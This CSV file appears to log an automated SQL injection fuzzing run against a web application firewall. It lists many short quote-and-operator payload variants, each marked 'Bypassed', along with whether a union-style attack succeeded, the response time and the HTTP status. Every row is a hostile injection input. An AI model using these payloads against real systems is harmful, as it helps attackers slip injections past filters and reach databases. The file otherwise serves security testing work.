Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0%27<@!=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0157,71.81,No,200
0'<@!=1.+,Bypassed,No,None,Unknown,0.0114,71.81,No,500
0%27<@!=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0157,71.81,No,200
0%27<@=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0259,71.81,No,200
0'<@=.1%0b,Bypassed,No,None,Unknown,0.0228,71.81,No,500
0%27<@=1+,Bypassed,Yes,unionAtk,Unknown,0.0185,71.81,No,200
0'<@!=1+,Bypassed,No,None,Unknown,0.01,71.81,No,500
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0138,71.81,No,200
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0105,71.81,No,200
0'<@!=.1+,Bypassed,No,None,Unknown,0.0191,71.81,No,500
0'<@!=.1%0b,Bypassed,No,None,Unknown,0.0176,71.81,No,500
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.0234,71.81,No,200
0'<@!=1.+,Bypassed,No,None,Unknown,0.0084,71.81,No,500
0%27<@=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0225,71.81,No,200
0'or+,Bypassed,No,None,Unknown,0.0117,71.81,No,500
0'<@!=1+,Bypassed,No,None,Unknown,0.0242,71.81,No,500
0'<@!=1+,Bypassed,No,None,Unknown,0.0094,71.81,No,500
0'<@!=1+,Bypassed,No,None,Unknown,0.0192,71.81,No,500
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0167,71.81,No,200
0%27<@!=1.+,Bypassed,Yes,unionAtk,Unknown,0.0152,71.81,No,200
0'<@=1.%0b,Bypassed,No,None,Unknown,0.0172,71.94,No,500
0%27<@=.1+,Bypassed,Yes,unionAtk,Unknown,0.0125,72.06,No,200
0'<@=1+,Bypassed,No,None,Unknown,0.0081,72.06,No,500
0%27<@=.1+,Bypassed,Yes,unionAtk,Unknown,0.0083,72.06,No,200
0%27<@!=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0146,72.06,No,200
0'<@!=1%0b,Bypassed,No,None,Unknown,0.0097,72.06,No,500
0'<@!=1+,Bypassed,No,None,Unknown,0.0118,72.06,No,500
0'<@=1+,Bypassed,No,None,Unknown,0.009,72.06,No,500
0%27<@=.1+,Bypassed,Yes,unionAtk,Unknown,0.0099,72.13,No,200
0'<@=1.%0b,Bypassed,No,None,Unknown,0.012,72.44,No,500
0'<@!=1%0b,Bypassed,No,None,Unknown,0.013,72.48,No,500
0%27<@!=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0092,72.52,No,200
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0089,72.52,No,200
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0188,72.52,No,200
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0197,72.52,No,200
0%27<@=1+,Bypassed,Yes,unionAtk,Unknown,0.0198,72.52,No,200
0'<@=1.+,Bypassed,No,None,Unknown,0.0179,72.52,No,500
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0187,72.52,No,200
0'<@=.1%0b,Bypassed,No,None,Unknown,0.0193,72.52,No,500
0'<@=.1+,Bypassed,No,None,Unknown,0.0252,72.52,No,500
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0138,72.52,No,200
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.0199,72.52,No,200
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.021,72.52,No,200
0%27<@=.1+,Bypassed,Yes,unionAtk,Unknown,0.012,71.81,No,200
0'<@!=.1+,Bypassed,No,None,Unknown,0.021,71.81,No,500
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0156,71.81,No,200
0'<@!=.1+,Bypassed,No,None,Unknown,0.0125,71.81,No,500
0%27<@=1+,Bypassed,Yes,unionAtk,Unknown,0.0351,71.81,No,200
0'<@!=.1%0b,Bypassed,No,None,Unknown,0.0129,71.81,No,500
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0166,71.81,No,200
0'<@!=1.+,Bypassed,No,None,Unknown,0.0109,71.81,No,500
0%27<@=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0109,71.81,No,200
0'<@!=1%0b,Bypassed,No,None,Unknown,0.0168,71.81,No,500
0%27||+,Bypassed,Yes,unionAtk,Unknown,0.0189,71.81,No,200
0'<@=1.+,Bypassed,No,None,Unknown,0.0179,71.81,No,500
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0245,71.81,No,200
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.0136,71.81,No,200
0'<@!=1.+,Bypassed,No,None,Unknown,0.0145,71.81,No,500
0'<@!=1%0b,Bypassed,No,None,Unknown,0.0187,71.81,No,500
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0203,71.81,No,200
0'<@!=.1%0b,Bypassed,No,None,Unknown,0.0123,71.81,No,500
0%27<@=1+,Bypassed,Yes,unionAtk,Unknown,0.0151,71.81,No,200
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0154,71.81,No,200
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0214,71.81,No,200
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.0074,71.81,No,200
0'<@!=.1+,Bypassed,No,None,Unknown,0.0152,71.81,No,500
0'<@=1.+,Bypassed,No,None,Unknown,0.014,71.81,No,500
0%27<@=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0217,71.81,No,200
0%27<@=1+,Bypassed,Yes,unionAtk,Unknown,0.0179,71.81,No,200
0'<@=.1+,Bypassed,No,None,Unknown,0.0123,71.81,No,500
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0108,71.81,No,200
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0142,71.81,No,200
0%27or%0b,Bypassed,Yes,unionAtk,Unknown,0.0118,72.06,No,200
0%27<@=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0161,72.06,No,200
0'<@=1.+,Bypassed,No,None,Unknown,0.0086,72.06,No,500
0%27<@=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0136,72.06,No,200
0'<@=.1%0b,Bypassed,No,None,Unknown,0.0093,72.06,No,500
0'<@!=1.+,Bypassed,No,None,Unknown,0.0104,72.06,No,500
0%27<@=1+,Bypassed,Yes,unionAtk,Unknown,0.0161,72.12,No,200
0'<@!=.1+,Bypassed,No,None,Unknown,0.0062,72.44,No,500
0%27<@=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0177,72.48,No,200
0'<@!=1.+,Bypassed,No,None,Unknown,0.0099,72.5,No,500
0'<@!=1%0b,Bypassed,No,None,Unknown,0.0086,72.52,No,500
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.0183,72.52,No,200
0%27<@=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.018,72.52,No,200
0'or%0b,Bypassed,No,None,Unknown,0.0186,72.52,No,500
0%27<@!=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0182,72.52,No,200
0'<@!=1.+,Bypassed,No,None,Unknown,0.0199,72.52,No,500
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0191,72.52,No,200
0%27<@=.1+,Bypassed,Yes,unionAtk,Unknown,0.0238,72.52,No,200
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.0175,72.52,No,200
0'<@!=1.+,Bypassed,No,None,Unknown,0.0124,72.52,No,500
0'<@=1%0b,Bypassed,No,None,Unknown,0.0178,72.52,No,500
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0159,71.81,No,200
0%27<@!=1.+,Bypassed,Yes,unionAtk,Unknown,0.017,71.81,No,200
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0153,71.81,No,200
0'<@=1.%0b,Bypassed,No,None,Unknown,0.0213,71.81,No,500
0'<@!=1.+,Bypassed,No,None,Unknown,0.0134,71.81,No,500
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.0228,71.81,No,200
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0191,71.81,No,200
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0168,71.81,No,200
0'<@=1%0b,Bypassed,No,None,Unknown,0.0152,71.81,No,500
0'<@!=1.%0b,Bypassed,No,None,Unknown,0.0186,71.81,No,500
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0236,71.81,No,200
0'<@!=.1%0b,Bypassed,No,None,Unknown,0.0127,71.81,No,500
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.0193,71.81,No,200
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0241,71.81,No,200
0'<@!=.1+,Bypassed,No,None,Unknown,0.0161,71.81,No,500
0'<@!=1.+,Bypassed,No,None,Unknown,0.0166,71.81,No,500
0%27<@=.1+,Bypassed,Yes,unionAtk,Unknown,0.0143,71.81,No,200
0'<@=1.%0b,Bypassed,No,None,Unknown,0.0147,71.81,No,500
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0144,71.81,No,200
0'<@!=1%0b,Bypassed,No,None,Unknown,0.0198,71.81,No,500
0%27<@!=1.+,Bypassed,Yes,unionAtk,Unknown,0.0149,71.81,No,200
0'<@=1%0b,Bypassed,No,None,Unknown,0.0103,71.81,No,500
0'<@=1.+,Bypassed,No,None,Unknown,0.0143,71.81,No,500
0'<@!=.1%0b,Bypassed,No,None,Unknown,0.0201,71.81,No,500
0%27<@!=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0146,71.81,No,200
0%27||+,Bypassed,Yes,unionAtk,Unknown,0.0103,71.81,No,200
0'<@=.1+,Bypassed,No,None,Unknown,0.0119,71.81,No,500
0'<@=.1%0b,Bypassed,No,None,Unknown,0.013,71.81,No,500
0%27<@=.1+,Bypassed,Yes,unionAtk,Unknown,0.0119,71.94,No,200
0'<@!=1+,Bypassed,No,None,Unknown,0.0132,72.06,No,500
0'<@!=.1+,Bypassed,No,None,Unknown,0.0213,72.06,No,500
0'<@!=.1+,Bypassed,No,None,Unknown,0.0067,72.06,No,500
0'<@!=.1+,Bypassed,No,None,Unknown,0.015,72.06,No,500
0'<@!=1.+,Bypassed,No,None,Unknown,0.0151,72.06,No,500
0'<@!=1+,Bypassed,No,None,Unknown,0.0129,72.06,No,500
0'<@=1.+,Bypassed,No,None,Unknown,0.0179,72.28,No,500
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0153,72.48,No,200
0'<@=1.+,Bypassed,No,None,Unknown,0.006,72.5,No,500
0'<@!=.1%0b,Bypassed,No,None,Unknown,0.0113,72.52,No,500
0'<@=1.+,Bypassed,No,None,Unknown,0.0158,72.52,No,500
0'<@!=1.%0b,Bypassed,No,None,Unknown,0.0186,72.52,No,500
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0182,72.52,No,200
0%27<@=.1+,Bypassed,Yes,unionAtk,Unknown,0.0182,72.52,No,200
0'<@!=1.%0b,Bypassed,No,None,Unknown,0.0197,72.52,No,500
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0187,72.52,No,200
0%27<@!=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0248,72.52,No,200
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0132,72.52,No,200
0'<@!=.1%0b,Bypassed,No,None,Unknown,0.0111,72.52,No,500
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0157,72.52,No,200
0'<@!=.1+,Bypassed,No,None,Unknown,0.0225,72.52,No,500
0'<@!=1.+,Bypassed,No,None,Unknown,0.0193,72.52,No,500
0%27<@=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0226,72.52,No,200
0%27<@!=1.+,Bypassed,Yes,unionAtk,Unknown,0.0109,72.52,No,200
0'<@=1+,Bypassed,No,None,Unknown,0.0198,72.52,No,500
0'<@=1.%0b,Bypassed,No,None,Unknown,0.0157,72.52,No,500
0'<@!=1.%0b,Bypassed,No,None,Unknown,0.0239,72.52,No,500
0%27<@=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0201,72.52,No,200
0'<@=.1+,Bypassed,No,None,Unknown,0.0133,72.52,No,500
0%27<@=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0103,72.52,No,200
0'<@=1.+,Bypassed,No,None,Unknown,0.0122,72.52,No,500
0'<@!=1%0b,Bypassed,No,None,Unknown,0.0123,72.52,No,500
0'<@=1+,Bypassed,No,None,Unknown,0.0124,72.52,No,500
0'<@=1%0b,Bypassed,No,None,Unknown,0.016,72.52,No,500
0'<@=1.%0b,Bypassed,No,None,Unknown,0.0236,72.52,No,500
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0246,72.52,No,200
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0133,72.52,No,200
0%27<@!=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0214,72.52,No,200
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0135,72.52,No,200
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0188,72.52,No,200
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0195,72.52,No,200
0%27<@!=1.+,Bypassed,Yes,unionAtk,Unknown,0.02,72.52,No,200
0%27<@=1+,Bypassed,Yes,unionAtk,Unknown,0.0162,72.52,No,200
0%27<@!=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0138,72.52,No,200
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.0196,72.52,No,200
0'<@=.1+,Bypassed,No,None,Unknown,0.0191,72.52,No,500
0'<@!=1.%0b,Bypassed,No,None,Unknown,0.0145,72.52,No,500
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0169,72.52,No,200
0%27<@=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0097,72.52,No,200
0'<@=1%0b,Bypassed,No,None,Unknown,0.0177,72.52,No,500
0%27<@=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0157,72.52,No,200
0%27<@=1+,Bypassed,Yes,unionAtk,Unknown,0.0163,72.52,No,200
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.0139,72.52,No,200
0'<@!=.1%0b,Bypassed,No,None,Unknown,0.0152,72.52,No,500
0%27<@=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0162,72.52,No,200
0%27<@!=1.+,Bypassed,Yes,unionAtk,Unknown,0.013,72.52,No,200
0%27<@=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0102,72.52,No,200
0%27<@!=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0128,72.52,No,200
0'<@=1+,Bypassed,No,None,Unknown,0.009,72.52,No,500
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0089,72.52,No,200
0'<@!=1%0b,Bypassed,No,None,Unknown,0.0045,72.52,No,500
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0086,72.52,No,200
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0149,72.52,No,200
0'<@!=.1%0b,Bypassed,No,None,Unknown,0.0126,72.52,No,500
0'<@=1+,Bypassed,No,None,Unknown,0.0144,72.52,No,500
0%27<@=.1+,Bypassed,Yes,unionAtk,Unknown,0.014,72.52,No,200
0%27<@=1+,Bypassed,Yes,unionAtk,Unknown,0.0129,72.52,No,200
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0082,72.52,No,200
0%27<@=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0111,72.52,No,200
0'<@=1+,Bypassed,No,None,Unknown,0.0063,72.52,No,500
0%27<@!=1.+,Bypassed,Yes,unionAtk,Unknown,0.0112,72.52,No,200
0%27<@=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0194,72.52,No,200
0%27<@!=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0203,72.52,No,200
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.0107,72.52,No,200
0'<@=1.+,Bypassed,No,None,Unknown,0.0227,72.52,No,500
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.0213,72.52,No,200
0'<@!=.1%0b,Bypassed,No,None,Unknown,0.0094,72.52,No,500
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.0178,72.52,No,200
0%27<@=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0154,72.52,No,200
0'<@=1+,Bypassed,No,None,Unknown,0.0135,72.52,No,500
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0179,72.52,No,200
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0222,72.52,No,200
0'<@=1+,Bypassed,No,None,Unknown,0.0071,72.52,No,500
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0129,72.52,No,200
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0127,72.52,No,200
0'<@!=1%0b,Bypassed,No,None,Unknown,0.0107,72.52,No,500
0'<@!=1.+,Bypassed,No,None,Unknown,0.0154,72.52,No,500
0%27<@=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0186,72.52,No,200
0%27<@!=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0219,72.52,No,200
0'<@!=1.+,Bypassed,No,None,Unknown,0.0128,72.52,No,500
0'<@=.1%0b,Bypassed,No,None,Unknown,0.0123,72.52,No,500
0'<@=1.%0b,Bypassed,No,None,Unknown,0.0162,72.52,No,500
0%27<@!=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0135,72.52,No,200
0%27<@=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.021,72.52,No,200
0'<@=1%0b,Bypassed,No,None,Unknown,0.0181,72.52,No,500
0'<@!=1+,Bypassed,No,None,Unknown,0.0231,72.52,No,500
0%27<@=1+,Bypassed,Yes,unionAtk,Unknown,0.0165,72.52,No,200
0%27<@!=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0256,72.52,No,200
0%27<@=.1+,Bypassed,Yes,unionAtk,Unknown,0.0135,72.52,No,200
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.0273,72.52,No,200
0%27<@!=1.+,Bypassed,Yes,unionAtk,Unknown,0.016,72.52,No,200
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.021,72.52,No,200
0'<@=1.+,Bypassed,No,None,Unknown,0.0217,72.52,No,500
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0257,72.52,No,200
0'<@!=1.+,Bypassed,No,None,Unknown,0.0105,72.52,No,500
0%27<@!=1.+,Bypassed,Yes,unionAtk,Unknown,0.0097,72.52,No,200
0'<@!=.1+,Bypassed,No,None,Unknown,0.0161,72.52,No,500
0'<@=.1+,Bypassed,No,None,Unknown,0.023,72.52,No,500
0%27<@!=1.+,Bypassed,Yes,unionAtk,Unknown,0.0134,72.52,No,200
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0085,72.52,No,200
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0153,72.52,No,200
0'<@=1.%0b,Bypassed,No,None,Unknown,0.013,72.52,No,500
0'<@!=.1%0b,Bypassed,No,None,Unknown,0.016,72.52,No,500
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0155,72.52,No,200
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0151,72.52,No,200
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0126,72.52,No,200
0%27<@=.1+,Bypassed,Yes,unionAtk,Unknown,0.0141,72.52,No,200
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0185,72.52,No,200
0'<@=1.+,Bypassed,No,None,Unknown,0.0156,72.52,No,500
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0161,72.52,No,200
0%27<@!=1.+,Bypassed,Yes,unionAtk,Unknown,0.0106,72.52,No,200
0%27<@=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0248,72.52,No,200
0'<@!=.1+,Bypassed,No,None,Unknown,0.0255,72.52,No,500
0'<@!=.1+,Bypassed,No,None,Unknown,0.0188,72.52,No,500
0'<@!=1.%0b,Bypassed,No,None,Unknown,0.0212,72.52,No,500
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0327,72.52,No,200
0'<@!=1+,Bypassed,No,None,Unknown,0.0175,72.52,No,500
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.011,72.52,No,200
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0252,72.52,No,200
0%27<@!=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.019,72.52,No,200
0'<@=1.+,Bypassed,No,None,Unknown,0.0201,72.52,No,500
0%27<@=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0198,72.52,No,200
0'<@=.1+,Bypassed,No,None,Unknown,0.0171,72.52,No,500
0'<@!=1.+,Bypassed,No,None,Unknown,0.0113,72.52,No,500
0'<@=1.%0b,Bypassed,No,None,Unknown,0.0227,72.52,No,500
0'<@!=1%0b,Bypassed,No,None,Unknown,0.0124,72.52,No,500
0%27<@!=1.+,Bypassed,Yes,unionAtk,Unknown,0.0125,72.52,No,200
0%27<@=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0121,72.52,No,200
0%27<@=1%0b,Bypassed,Yes,unionAtk,Unknown,0.011,72.52,No,200
0%27||%0b,Bypassed,Yes,unionAtk,Unknown,0.0127,72.52,No,200
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0164,72.52,No,200
0'<@!=1.%0b,Bypassed,No,None,Unknown,0.016,72.52,No,500
0'<@=1.+,Bypassed,No,None,Unknown,0.0109,72.52,No,500
0'<@=.1%0b,Bypassed,No,None,Unknown,0.0177,72.52,No,500
0%27<@=1+,Bypassed,Yes,unionAtk,Unknown,0.0196,72.52,No,200
0'<@=1.+,Bypassed,No,None,Unknown,0.018,72.52,No,500
0%27<@=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0157,72.52,No,200
0%27<@=.1+,Bypassed,Yes,unionAtk,Unknown,0.0154,72.52,No,200
0'<@!=1+,Bypassed,No,None,Unknown,0.0176,72.52,No,500
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0099,72.52,No,200
0'<@=.1%0b,Bypassed,No,None,Unknown,0.025,72.52,No,500
0'<@=1.+,Bypassed,No,None,Unknown,0.0188,72.52,No,500
0'<@!=1.+,Bypassed,No,None,Unknown,0.0085,72.52,No,500
0'<@!=.1+,Bypassed,No,None,Unknown,0.0122,72.52,No,500
0'<@=.1%0b,Bypassed,No,None,Unknown,0.0155,72.52,No,500
0'<@=1.+,Bypassed,No,None,Unknown,0.0086,72.52,No,500
0%27<@!=1.+,Bypassed,Yes,unionAtk,Unknown,0.011,72.52,No,200
0'<@!=.1+,Bypassed,No,None,Unknown,0.0091,72.52,No,500
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.0197,72.52,No,200
0'<@=1%0b,Bypassed,No,None,Unknown,0.01,72.52,No,500
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0092,72.52,No,200
0%27<@=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0131,72.52,No,200
0'<@!=.1%0b,Bypassed,No,None,Unknown,0.0113,72.52,No,500
0%27<@=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0129,72.52,No,200
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0152,72.52,No,200
0%27<@=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0113,72.52,No,200
0'<@!=1.%0b,Bypassed,No,None,Unknown,0.0098,72.52,No,500
0'<@!=1.%0b,Bypassed,No,None,Unknown,0.0123,72.52,No,500
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.0145,72.52,No,200
0%27<@!=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0165,72.52,No,200
0'<@!=.1+,Bypassed,No,None,Unknown,0.0184,72.52,No,500
0%27<@=1+,Bypassed,Yes,unionAtk,Unknown,0.021,72.52,No,200
0'<@=1%0b,Bypassed,No,None,Unknown,0.0209,72.52,No,500
0%27<@=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0107,72.52,No,200
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0337,72.52,No,200
0%27<@!=1.+,Bypassed,Yes,unionAtk,Unknown,0.0139,72.52,No,200
0'<@!=.1%0b,Bypassed,No,None,Unknown,0.0219,72.52,No,500
0%27<@!=1.+,Bypassed,Yes,unionAtk,Unknown,0.0209,72.52,No,200
0%27<@!=1.+,Bypassed,Yes,unionAtk,Unknown,0.0083,72.52,No,200
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.0102,72.52,No,200
0%27<@=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0105,72.52,No,200
0%27<@=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0162,72.52,No,200
0'<@=1.+,Bypassed,No,None,Unknown,0.0132,72.52,No,500
0'<@!=1.+,Bypassed,No,None,Unknown,0.0109,72.52,No,500
0'<@!=1%0b,Bypassed,No,None,Unknown,0.0247,72.52,No,500
0%27<@=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0121,72.52,No,200
0'<@!=1.+,Bypassed,No,None,Unknown,0.0091,72.52,No,500
0%27<@=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0165,72.52,No,200
0%27<@=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0165,72.52,No,200
0'<@=.1%0b,Bypassed,No,None,Unknown,0.0154,72.52,No,500
0%27<@=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0166,72.52,No,200
0'<@=1.%0b,Bypassed,No,None,Unknown,0.0152,72.52,No,500
0'<@=.1+,Bypassed,No,None,Unknown,0.0159,72.52,No,500
0'<@!=.1%0b,Bypassed,No,None,Unknown,0.0112,72.52,No,500
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.0165,72.52,No,200
0%27<@=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0113,72.52,No,200
0%27<@!=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0144,72.52,No,200
0%27<@=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0129,72.52,No,200
0'<@=1+,Bypassed,No,None,Unknown,0.01,72.52,No,500
0'<@!=1%0b,Bypassed,No,None,Unknown,0.0126,72.52,No,500
0%27<@!=1.+,Bypassed,Yes,unionAtk,Unknown,0.0297,72.52,No,200
0%27<@=.1+,Bypassed,Yes,unionAtk,Unknown,0.0124,72.52,No,200
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0164,72.52,No,200
0'<@=1.%0b,Bypassed,No,None,Unknown,0.0124,72.52,No,500
0%27<@!=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0222,72.52,No,200
0'<@!=1+,Bypassed,No,None,Unknown,0.0213,72.52,No,500
0'<@!=.1+,Bypassed,No,None,Unknown,0.0098,72.52,No,500
0%27<@=1+,Bypassed,Yes,unionAtk,Unknown,0.0085,72.52,No,200
0%27or+,Bypassed,Yes,unionAtk,Unknown,0.0139,72.52,No,200
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0132,72.52,No,200
0'<@!=1%0b,Bypassed,No,None,Unknown,0.0082,72.52,No,500
